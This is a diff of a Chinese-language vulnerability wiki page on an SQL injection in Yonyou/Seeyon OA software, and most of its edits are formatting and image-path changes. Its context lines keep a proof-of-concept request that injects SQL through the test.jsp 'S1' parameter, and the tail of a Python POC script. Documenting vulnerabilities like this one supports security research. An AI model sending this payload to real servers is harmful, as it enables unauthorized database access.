@@ -20,19 +20,19 @@
 
 可参考 文章
 
-[致远OA A6 test.jsp SQL注入漏洞](http://wiki.peiqi.tech/PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A6 test.jsp SQL注入漏洞.html)
+\[致远OA A6 test.jsp SQL注入漏洞]\(http://wiki.peiqi.tech/PeiQi\_Wiki/OA产品漏洞/致远OA/致远OA A6 test.jsp SQL注入漏洞.html)
 
 登录页面如下
 
-![yongyou-1-1](images/yongyou-1-1.png)
+![yongyou-1-1](../.gitbook/assets/yongyou-1-1.png)
 
 POC
 
-```plain
+```
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
 ```
 
-![yongyou-1-2](images/yongyou-1-2.png)
+![yongyou-1-2](../.gitbook/assets/yongyou-1-2.png)
 
 利用方法与致远OA 的SQL注入类似
 
@@ -76,4 +76,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![yongyou-1-3](images/yongyou-1-3.png)
+![yongyou-1-3](../.gitbook/assets/yongyou-1-3.png)
